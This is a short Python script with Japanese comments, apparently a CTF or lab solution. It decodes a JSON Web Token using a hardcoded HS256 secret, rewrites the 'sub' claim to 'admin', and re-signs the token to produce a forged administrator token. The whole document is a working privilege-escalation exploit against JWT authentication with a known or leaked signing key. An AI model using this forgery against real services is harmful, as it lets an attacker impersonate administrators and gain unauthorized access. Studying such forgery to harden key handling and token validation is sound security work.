import jwt

key = "20e515c7d11a1cfd9b4f504dfbf05efadbcecf9c5a2b22bab223444aa2bbcb32"
token = input("token >")

# ペイロードjsonを取得
payload = jwt.decode(token, key, algorithms="HS256")

# ペイロードのsubをadminに書き換え
payload["sub"] = "admin"

# 再署名して新しいJWTトークンを生成
modified_token = jwt.encode(
    payload=payload,
    key=key,
    algorithm="HS256"
)

print("admin JWT token: \n" + modified_token)